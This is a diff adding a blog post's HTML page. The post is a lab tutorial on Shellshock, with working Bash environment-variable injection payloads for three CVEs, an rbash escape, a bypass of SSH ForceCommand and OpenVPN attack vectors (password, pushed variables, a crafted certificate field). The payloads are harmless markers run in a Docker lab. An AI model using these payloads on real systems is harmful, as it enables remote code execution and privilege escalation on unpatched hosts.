@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>() { Magic Bash Runes</title>
+  <meta name="description" content="Despite of been 4 years old, Shellshock is still a very interestingtopic to me not for the vulnerability itself but for the largeways to trigger it even in t...">
+
+  
+    <link href='//fonts.googleapis.com/css?family=Lato:400,400italic' rel='stylesheet' type='text/css'>
+  
+
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        extensions: ["tex2jax.js"],
+        jax: ["input/TeX","output/HTML-CSS"],
+        tex2jax: {inlineMath: [["$$","$$"],["\\(","\\)"]]},
+	TeX: {
+	  Macros: {
+            
+	  }
+	}
+      });
+    </script>
+    
+      <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js' async></script>
+    
+  
+
+  
+    <script
+       src="https://code.jquery.com/jquery-3.4.1.min.js"
+       integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+       crossorigin="anonymous"></script>
+  
+
+  
+
+    
+      <script src='https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.9.1/underscore-min.js' ></script>
+    
+
+    
+      <script src="https://d3js.org/d3.v4.min.js"></script>
+    
+
+    <script src='/book-of-gehn/js/venn/venn.min.js'></script>
+    <script src='/book-of-gehn/js/venn/helper.js'></script>
+
+    <script src='/book-of-gehn/js/fix_syntax_highlight.js'></script>
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/tufte.css">
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/latex.css">
+
+  <link rel="canonical" href="/book-of-gehn/articles/2018/10/01/Magic-Bash-Runes.html">
+
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/all.min.css">
+
+  <link type="application/atom+xml" rel="alternate" href="/book-of-gehn/feed.xml" title="The Book of Gehn" />
+</head>
+
+  <body>
+    <header>
+	
+		<h1 class="header-title"><a href="/book-of-gehn/">The Book of Gehn</a></h1>
+		
+		
+	
+
+    
+
+    
+</header>
+
+    <article class="group">
+      <h1>() { Magic Bash Runes</h1>
+<p class="subtitle">October 1, 2018</p>
+
+<p>Despite of been 4 years old, <code class="highlighter-rouge">Shellshock</code> is still a very interesting
+topic to me not for the vulnerability itself but for the large
+ways to trigger it even in the most unexpected places.</p>
+
+<p>Take the 4 characters <code class="highlighter-rouge">() {</code> and open the world.
+<label for="mf-f40ce0988735db556d111316cae05d24" class="margin-toggle ">⊕</label><input type="checkbox" id="mf-f40ce0988735db556d111316cae05d24" class="margin-toggle " /><span class="marginnote "><img class="fullwidth" alt="Fragments found in the field." src="/book-of-gehn/assets/shellshock/runes.png" />  <br /></span></p>
+
+<p>Creativity and few hours reading man pages are all what you need.<!--more--></p>
+
+<h3 id="lab">Lab</h3>
+
+<p>For the following examples I created a docker image that compiles
+a vulnerable Bash version.</p>
+
+<p><label for="mn-9f5a493d0f4af2374b4250ca1416cd85" class="margin-toggle"> ⊕</label><input type="checkbox" id="mn-9f5a493d0f4af2374b4250ca1416cd85" class="margin-toggle" /><span class="marginnote">Based on this <a href="https://github.com/tianon/docker-bash/tree/master/4.1">Dockerfile</a> </span></p>
+
+<p>From <a href="https://github.com/eldipa/book-of-gehn//tree/master/assets/shellshock">here</a> you can download
+the Dockerfile and the rest of the files and
+build the image yourself:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>docker build <span class="nt">-t</span> shellshock <span class="nb">.</span>      <span class="c"># byexample: +skip</span>
+&lt;...&gt;
+Successfully tagged shellshock:latest
+
+</code></pre></div></div>
+
+<p>From there, run the following to get a temporal shell:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>docker run <span class="nt">-it</span> <span class="nt">--rm</span>  <span class="nt">--cap-add</span><span class="o">=</span>NET_ADMIN shellshock       <span class="c"># byexample: +skip</span>
+
+</code></pre></div></div>
+
+<blockquote>
+  <p>If the <code class="highlighter-rouge">--cap-add=NET_ADMIN</code> looks to you a little suspicious, I don’t
+blame you. The flag is needed to run the OpenVPN examples.</p>
+</blockquote>
+
+<p>Then, to run the SSH examples you need to run the SSH server:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>/usr/sbin/sshd                    <span class="c"># byexample: +fail-fast</span>
+
+</code></pre></div></div>
+
+<p>And for the OpenVPN examples, you need to create a TUN device:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-p</span> /dev/net
+<span class="nv">$ </span><span class="o">[</span> <span class="nt">-e</span> /dev/net/tun <span class="o">]</span> <span class="o">||</span> <span class="nb">mknod</span> /dev/net/tun c 10 200<span class="p">;</span>      <span class="c"># byexample: +fail-fast</span>
+
+</code></pre></div></div>
+
+<!--
+$ ssh -p 2201 127.0.0.1 'ls'        # byexample: +pass
+$ ssh -p 2202 127.0.0.1 'ls'        # byexample: +pass
+
+-->
+
+<h2 id="magic-bash-runes">Magic Bash runes</h2>
+
+<p>Bash allows to write a function definition inside of an environment variable
+and pass it to a subshell.</p>
+
+<p>The only requirement is that the definition must begin with the magic <code class="highlighter-rouge">() {</code>
+four bytes.</p>
+
+<h2 id="cve-2014-6271----cmd">CVE-2014-6271: <code class="highlighter-rouge">() { :;}; CMD</code></h2>
+
+<p>When Bash passes that env var, it will detect the <code class="highlighter-rouge">() {</code> prefix and
+it will parse <em>and</em> execute the remaining function definition.</p>
+
+<p>The bug happen because Bash will not stop after the function’s end
+but it will continue parsing and executing the rest <code class="highlighter-rouge">CMD</code>.</p>
+
+<p>Try this in the lab:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ X</span><span class="o">=</span><span class="s1">'() { :; }; /bin/echo vuln'</span>
+<span class="nv">$ </span><span class="nb">export </span>X
+<span class="nv">$ </span>bash <span class="nt">-c</span> <span class="s1">'echo "foo"'</span>
+vuln
+&lt;...&gt;
+
+</code></pre></div></div>
+
+<!--
+$ unset X   # byexample: +pass
+-->
+
+<p>Or, in one line:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ X</span><span class="o">=</span><span class="s1">'() { :; }; /bin/echo vuln'</span> bash <span class="nt">-c</span> <span class="s1">'echo "foo"'</span>
+vuln
+&lt;...&gt;
+
+</code></pre></div></div>
+
+<p>If you are vulnerable, that command should print <code class="highlighter-rouge">vuln</code>
+(and probably it will crash too).</p>
+
+<p>Because the bug happens in a very early phase, <code class="highlighter-rouge">CMD</code> must be
+with the full path (<code class="highlighter-rouge">PATH</code> may not exist)</p>
+
+<h3 id="cve-2014-7169---function-a-a--bash--c-file-cmd">CVE-2014-7169: <code class="highlighter-rouge">() { function a a&gt;\</code> &amp; <code class="highlighter-rouge">bash -c "FILE CMD"</code></h3>
+
+<p>The incantation of these runes has two parts.</p>
+
+<p>Imagine the following command that prints two words:</p>
+
+<!-- no colors for this -->
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo echo vuln
+echo vuln
+
+</code></pre></div></div>
+
+<p>The first <code class="highlighter-rouge">echo</code> is the command and the rest its arguments: it
+has nothing weird on its own.</p>
+
+<p>The <code class="highlighter-rouge">() { function a a&gt;\</code> part makes a <em>incomplete</em> function
+definition, in particular
+the fragment <code class="highlighter-rouge">a&gt;\</code> will redirect to a unspecified file the output
+and Bash will complete the definition with the <em>next input</em>.</p>
+
+<p>And here is where the magic happens.</p>
+
+<p>The first <code class="highlighter-rouge">echo</code> will <em>not</em> be the command but the name of the file
+to redirect the output.</p>
+
+<p>The rest of the input <code class="highlighter-rouge">echo vuln</code> will be interpreted as a full
+command: that means that the first argument is converted to
+the name of a command.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ X</span><span class="o">=</span><span class="s1">'() { function a a&gt;\'</span> bash <span class="nt">-c</span> <span class="s2">"echo echo vuln"</span>
+&lt;...&gt;
+
+<span class="nv">$ </span><span class="nb">cat echo
+</span>vuln
+
+</code></pre></div></div>
+
+<!--
+$ rm -f echo    # clean up
+
+-->
+
+<p>Instead of printing the literal <code class="highlighter-rouge">"echo vuln"</code> string and cat-ing
+an inexistent file <code class="highlighter-rouge">"echo"</code>,
+a vulnerable Bash will execute the first argument and it will redirect
+its output to a file named <code class="highlighter-rouge">"echo"</code>.</p>
+
+<p>Here is another example.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>bash <span class="nt">-c</span> <span class="s1">'echo $0 $1 | hd'</span> A B
+00000000  41 20 42 0a                                       |A B.|
+00000004
+
+</code></pre></div></div>
+
+<p>If the attacker controls <code class="highlighter-rouge">$0</code> and <code class="highlighter-rouge">$1</code>, he can trigger the vuln
+setting <code class="highlighter-rouge">$0</code> to the command of his desire and <code class="highlighter-rouge">$1</code> to <code class="highlighter-rouge">#</code> to comment out
+the pipe (the arguments must be without quotes, <code class="highlighter-rouge">"$1"</code> will not work).</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ X</span><span class="o">=</span><span class="s1">'() { function a a&gt;\'</span> bash <span class="nt">-c</span> <span class="s2">"echo id # | hd"</span><span class="p">;</span> <span class="nb">cat echo</span>
+&lt;...&gt;
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>&lt;...&gt;
+
+</code></pre></div></div>
+<!--
+$ rm -f echo    # clean up
+
+-->
+
+<p>Another example, a shorter variant with less runes needed:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ X</span><span class="o">=</span><span class="s1">'() { (a)=&gt;\'</span> bash <span class="nt">-c</span> <span class="s2">"echo id"</span><span class="p">;</span> <span class="nb">cat echo</span>
+&lt;...&gt;
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>&lt;...&gt;
+
+</code></pre></div></div>
+
+<!--
+$ rm -f echo    # clean up
+
+-->
+
+<h3 id="cve-2014-6278---_--_--cmd-">CVE-2014-6278: <code class="highlighter-rouge">() { _; } &gt;_[$($())] { CMD }</code></h3>
+
+<p>The interesting thing is that
+this doesn’t look like a parsing bug but a feature.</p>
+
+<p>I was succeeded to trigger this one in a vulnerable VM from
+<a href="https://pentesterlab.com/exercises/cve-2014-6271">PentesterLab</a>
+but I couldn’t trigger it in my own lab.</p>
+
+<p>Here is how it should be invoked:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ X</span><span class="o">=</span><span class="s1">'() { _; } &gt;_[$($())] { /bin/sleep 5 }'</span> bash <span class="nt">-c</span> <span class="s1">'date'</span>      <span class="c"># byexample: +skip</span>
+
+</code></pre></div></div>
+
+<h2 id="subshells-from-python-ruby">Subshells from Python, Ruby</h2>
+
+<p>It is not necessary to run Bash directly to trigger the vuln.</p>
+
+<p>Any process that pass the env variables to a vulnerable Bash is enough:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ X</span><span class="o">=</span><span class="s1">'() { :; }; echo "vuln"'</span> python <span class="nt">-c</span> <span class="s1">'import os; os.system("ls")'</span>
+vuln
+&lt;...&gt;
+
+</code></pre></div></div>
+
+<p>Python’s <code class="highlighter-rouge">os.system</code> spawns a shell, typically <code class="highlighter-rouge">/bin/sh</code> and runs
+inside it the given command.</p>
+
+<p>The trick is that <code class="highlighter-rouge">/bin/sh</code> in some mainstream systems is a link
+to <code class="highlighter-rouge">/bin/bash</code>, enabling the bug to other interpreters.</p>
+
+<p>Python, Ruby, virtually any software the spawn a subshell is affected.</p>
+
+<h2 id="restricted-bash-bypass">Restricted Bash bypass</h2>
+
+<p>We cannot trigger the vuln if the shell spawned is in restricted mode</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ X</span><span class="o">=</span><span class="s1">'() { :;}; /bin/echo vuln'</span> bash <span class="nt">-r</span> <span class="nt">-c</span> <span class="s1">'echo baz'</span>
+baz
+
+</code></pre></div></div>
+
+<p>This is because:</p>
+
+<blockquote>
+  <p>“A restricted shell […] (does not allow) importing function definitions
+from the shell environment at startup”</p>
+
+  <footer><a href="https://linux.die.net/man/1/bash">bash(1)</a>, <em>Restricted shell</em></footer>
+</blockquote>
+
+<p>But the same man page gives us a way to escape: nothing prevent us to
+trigger the vuln <em>within</em> the restricted shell:</p>
+
+<blockquote>
+  <p>“When a command that is found to be a shell script is executed […],
+rbash  turns  off  any restrictions in the shell spawned to execute
+the script.”</p>
+
+  <footer><a href="https://linux.die.net/man/1/bash">bash(1)</a>, <em>Restricted shell</em></footer>
+</blockquote>
+
+<p>The only thing that we need is just an executable shell script in the <code class="highlighter-rouge">PATH</code>
+to target it:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /bin/egrep
+<span class="c">#!/bin/sh</span>
+<span class="nb">exec grep</span> <span class="nt">-E</span> <span class="s2">"</span><span class="nv">$@</span><span class="s2">"</span>
+
+<span class="nv">$ X</span><span class="o">=</span><span class="s1">'() { :;}; /bin/echo vuln'</span> bash <span class="nt">-r</span> <span class="nt">-c</span> <span class="s1">'egrep'</span>
+vuln
+&lt;...&gt;
+
+</code></pre></div></div>
+
+<p>This may allow you to escape from the restricted shell or at least it will
+allow you to perform some prohibited actions like <code class="highlighter-rouge">cd</code> or redirections:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ X</span><span class="o">=</span><span class="s1">'() { :;}; cd /home ; echo "foo" &gt; bar '</span> bash <span class="nt">-r</span> <span class="nt">-c</span> <span class="s1">'egrep'</span>
+&lt;...&gt;
+
+<span class="nv">$ </span><span class="nb">cat</span> /home/bar
+foo
+
+</code></pre></div></div>
+
+<!--
+$ rm -f /home/bar # clean up
+
+-->
+
+<p><label for="mn-be6b5d22eaa77c857d6993dcf00fe3ab" class="margin-toggle"> ⊕</label><input type="checkbox" id="mn-be6b5d22eaa77c857d6993dcf00fe3ab" class="margin-toggle" /><span class="marginnote">I am sure that there are other clever
+and creative ways to <em>priv esc</em> using shellshock besides using a
+<code class="highlighter-rouge">setuid</code> program. </span></p>
+
+<p>If you think, this can be used for a privilege escalation:
+running as a
+normal user, if a <code class="highlighter-rouge">setuid</code> program spawn a shell you will get a path to root
+pretty straightforward.</p>
+
+<h2 id="ssh">SSH</h2>
+
+<p>SSH will send some environment variables by default, like <code class="highlighter-rouge">TERM</code>
+regardless of the configuration of the server or client as long as
+we allocate a remote pseudo-terminal (<code class="highlighter-rouge">-t</code>)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>" [...] the TERM environment variable is always sent whenever
+a pseudo-terminal is requested as it is required by the protocol."
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ TERM</span><span class="o">=</span><span class="s1">'() { :;}; /bin/echo vuln'</span> ssh <span class="nt">-t</span> <span class="nt">-p</span> 2201 127.0.0.1 <span class="nb">exit
+</span>vuln&lt;...&gt;
+
+</code></pre></div></div>
+
+<p>This may seems pointless because we have a remote shell anyways.</p>
+
+<p>But SSH has a <code class="highlighter-rouge">ForceCommand</code> option that set a command to be executed
+when the user logs in, ignoring any command supplied by him.</p>
+
+<p>This is used by some folks to restrict the access to the system, typically
+setting this to <code class="highlighter-rouge">/bin/false</code> or something like that:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-p</span> 2202 127.0.0.1 <span class="s1">'ls'</span>
+No shell <span class="k">for </span>you. Sorry.
+
+</code></pre></div></div>
+
+<p>But the forced command is executed by the user’s shell configured in the
+server. If this one is Bash, we can bypass the restriction.</p>
+
+<p>This option opens another crack as it sets the <code class="highlighter-rouge">SSH_ORIGINAL_COMMAND</code>
+environment variable with the value of the intended and ignored command.</p>
+
+<p>So, if instead <code class="highlighter-rouge">ls</code> we set our magic runes we will get remote execution:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-p</span> 2202 127.0.0.1 <span class="s1">'() { :;}; /bin/echo vuln'</span>
+vuln
+&lt;...&gt;
+
+</code></pre></div></div>
+
+<h2 id="openvpn">OpenVPN</h2>
+
+<p><label for="mn-a64ceecdf327f743578104fb344c422c" class="margin-toggle"> ⊕</label><input type="checkbox" id="mn-a64ceecdf327f743578104fb344c422c" class="margin-toggle" /><span class="marginnote">By the way, the <a href="https://github.com/OpenVPN/openvpn/tree/master/sample">OpenVPN</a>
+repository has a very complete script that
+shows you how to create CA, Certs and other stuff. Nice! </span></p>
+
+<p>In the following examples the
+<a href="https://github.com/eldipa/book-of-gehn//tree/master/assets/shellshock/files">configuration files</a>
+<code class="highlighter-rouge">vpn-srv.conf</code> and
+<code class="highlighter-rouge">vpn-cli.conf</code> sets the IP addresses, ports and certificates:
+standard stuff.</p>
+
+<p>In each example I am passing the extra
+parameters that enable the attack
+explicitly via command line.</p>
+
+<h3 id="user-and-pass">User and Pass</h3>
+
+<p>In this first scenario the server uses a Bash script to verify the
+user’s name and password.</p>
+
+<p>To open the door to the vulnerability, the server must pass
+the credentials using environment variables.</p>
+
+<p>OpenVPN will reject this by default so we need to set
+the highest security level with <code class="highlighter-rouge">--script-security 3</code> to allow this.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>openvpn <span class="nt">--config</span> vpn-srv.conf <span class="nt">--auth-user-pass-verify</span> login.sh via-env <span class="nt">--mode</span> server <span class="nt">--script-security</span> 3 <span class="o">&gt;</span>/dev/null &amp;
+&lt;...&gt;
+
+</code></pre></div></div>
+
+<p>From the client side, the magic runes need to be in the credential file,
+in the place of the password:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>openvpn <span class="nt">--config</span> vpn-cli.conf <span class="nt">--auth-user-pass</span> evil-cred <span class="nt">--pull</span> <span class="o">&gt;</span>/dev/null   <span class="c"># byexample: +stop-on-silence +timeout=5</span>
+&lt;...&gt;
+
+<span class="nv">$ </span><span class="nb">cat </span>evil-cred
+foo
+<span class="o">()</span> <span class="o">{</span> :<span class="p">;</span><span class="o">}</span><span class="p">;</span> /bin/touch pwned
+
+</code></pre></div></div>
+
+<!--
+$ rm -f pwned # clean up
+$ killall openvpn ; wait  # byexample: +pass
+
+-->
+
+<p>And <em>presto</em>, the client has remote execution in the server.</p>
+
+<p>But, only in the password…. Why?</p>
+
+<p>The runes need to be in the password, because it is not <em>remapped</em>.</p>
+
+<p>OpenVPN remaps the values of the env variables allowing a very reduced
+set of symbols; the password is not affected, thanks God!</p>
+
+<p>It could be in the username too as starting OpenVPN 2.0.1 it is not
+remapped any more when it is passed to
+<code class="highlighter-rouge">OPENVPN_PLUGIN_AUTH_USER_PASS_VERIFY</code> plugin.</p>
+
+<p>If this is vulnerable or not is another story.</p>
+
+<h3 id="push-and-pull">Push and Pull</h3>
+
+<p>Now the roles are inverted here.</p>
+
+<p>In this case the server will set up a trap to get remote execution
+on the client side.</p>
+
+<p>For this, it pushes a environment variable to the client with the
+magic runes:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>openvpn <span class="nt">--config</span> vpn-srv.conf <span class="nt">--push</span> <span class="s1">'setenv-safe Z "() { :;}; /bin/touch pwned"'</span> &amp;
+&lt;...&gt;
+
+</code></pre></div></div>
+
+<p>The client needs to <em>pull</em> the variables and execute some external script.</p>
+
+<p>I chose <code class="highlighter-rouge">--up</code> but other should work</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>openvpn <span class="nt">--config</span> vpn-cli.conf <span class="nt">--up</span> env.sh <span class="nt">--script-security</span> 2 <span class="nt">--pull</span>   <span class="c"># byexample: +stop-on-silence +timeout=5</span>
+&lt;...&gt;
+
+<span class="nv">$ </span><span class="o">[</span> <span class="nt">-e</span> pwned <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"you've been pwned"</span>
+you<span class="s1">'ve been pwned
+
+</span></code></pre></div></div>
+
+<!--
+$ rm -f pwned # clean up
+$ killall openvpn ; wait  # byexample: +pass
+
+-->
+
+<p>The <code class="highlighter-rouge">setenv-safe</code> sets an environment variable with a safe name (prefixed
+with <code class="highlighter-rouge">OPENVPN</code>) but the trick is not in the name but in its content.</p>
+
+<p>The client will execute a shell script (needs at least <code class="highlighter-rouge">--script-security 2</code>)
+and the malicious env var will be pushed to the client, executed and exploited.</p>
+
+<h3 id="x509-param">X509 param</h3>
+
+<p>This one is tricky.</p>
+
+<p>All the scripts that OpenVPN can execute receive a <em>remapped</em> version of the
+environment variables.</p>
+
+<p>Depending of the variable the remap allows more or less character but
+in any case the remap process destroys the magic runes.</p>
+
+<p>But the are exceptions: <code class="highlighter-rouge">password</code> as it was mentioned before
+and <code class="highlighter-rouge">X509_{n}_{m}</code>.</p>
+
+<p>When a endpoint uses an external script to validate the TLS identity
+through <code class="highlighter-rouge">--tls-verify</code>, it receives an environment variable for each
+part of the <code class="highlighter-rouge">Subject</code> of the both certificates: the client’s and
+the server’s.</p>
+
+<p>Here the server sets up an evil certificate:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>openvpn <span class="nt">--config</span> vpn-srv.conf <span class="nt">--cert</span> evil.crt <span class="nt">--key</span> evil.key  <span class="o">&gt;</span>/dev/null &amp;
+&lt;...&gt;
+
+</code></pre></div></div>
+
+<p>The malicious certificate has a crafted <code class="highlighter-rouge">emailAddress</code> inside
+of the <code class="highlighter-rouge">Subject</code> that has the incantation.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>openssl x509 <span class="nt">-in</span> evil.crt <span class="nt">-text</span>
+Certificate:
+    Data:
+        Version: 3 <span class="o">(</span>0x2<span class="o">)</span>
+        Serial Number: 2 <span class="o">(</span>0x2<span class="o">)</span>
+    Signature Algorithm: sha256WithRSAEncryption
+        &lt;...&gt;
+        Subject: <span class="nv">C</span><span class="o">=</span>KG, <span class="nv">ST</span><span class="o">=</span>NA, &lt;...&gt;emailAddress<span class="o">=()</span> <span class="o">{</span> :<span class="p">;</span><span class="o">}</span><span class="p">;</span> /bin/cp /bin/cp /
+&lt;...&gt;
+
+</code></pre></div></div>
+
+<p>On the client side, we just have to verify TLS with a script and allow it
+to run with <code class="highlighter-rouge">--script-security 2</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>openvpn <span class="nt">--config</span> vpn-cli.conf <span class="nt">--tls-verify</span> env.sh <span class="nt">--script-security</span> 2   <span class="c"># byexample: +stop-on-silence +timeout=5</span>
+&lt;...&gt;
+
+<span class="nv">$ </span><span class="o">[</span> <span class="nt">-e</span> /cp <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"you've been pwned"</span>
+you<span class="s1">'ve been pwned
+
+</span></code></pre></div></div>
+
+<p>The variables <code class="highlighter-rouge">X509_{n}_{m}</code> will contain the <em>raw</em> pieces of <code class="highlighter-rouge">Subject</code>
+of the client’s certificate (<code class="highlighter-rouge">{n} = 1</code>) and the server’s certificate
+(<code class="highlighter-rouge">{n} = 0</code>) where <code class="highlighter-rouge">{m}</code> will have the <code class="highlighter-rouge">Subject</code>’s field name, like
+<code class="highlighter-rouge">emailAddress</code>.</p>
+
+<p>Does it mean that we can reverse the roles and exploit the server? Who knows.</p>
+
+<p>In my container lab I couldn’t trigger the bug: it seems that the server
+verification fails but it doesn’t execute the payload.</p>
+
+<p>So in theory yes, but I don’t have evidence.</p>
+
+<!--
+$ rm -f cp  # clean up
+$ killall openvpn ; wait  # byexample: +pass
+
+-->
+
+<h2 id="final-thoughts">Final thoughts</h2>
+
+<p>What I can say? Having a remote execution crafting a X509 attribute
+writing just <code class="highlighter-rouge">() {</code> makes me think about the complexity of
+the software with a smile in my face.</p>
+
+<p><label for="mn-8dee7e4f8cd082eb99a3de63d39aaaf8" class="margin-toggle"> ⊕</label><input type="checkbox" id="mn-8dee7e4f8cd082eb99a3de63d39aaaf8" class="margin-toggle" /><span class="marginnote">See these in <a href="https://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html">lcamtuf’s post</a> </span></p>
+
+<p>There are more vulnerabilities
+and <a href="https://github.com/mubix/shellshocker-pocs">vectors</a>
+out there than the shown here: Web Servers, CUPS, DHCP.</p>
+
+<p><code class="highlighter-rouge">Shellshock</code> came up 4 years ago and it is still surprising me.</p>
+
+
+
+
+    </article>
+    <span class="print-footer">() { Magic Bash Runes - October 1, 2018 - Gehn</span>
+    <footer>
+    <hr class="slender">
+    <div class="credits">
+        <span>&copy; 2021
+            
+            Gehn
+        </span></br>
+            <a style="text-decoration: none;" href="/book-of-gehn/feed.xml"><img height="16px" width="16px" src="/book-of-gehn/assets/blog-assets/rss-32px.png" /></a>
+        <br>
+        
+
+    
+    </div>
+</footer>
+
+  </body>
+</html>
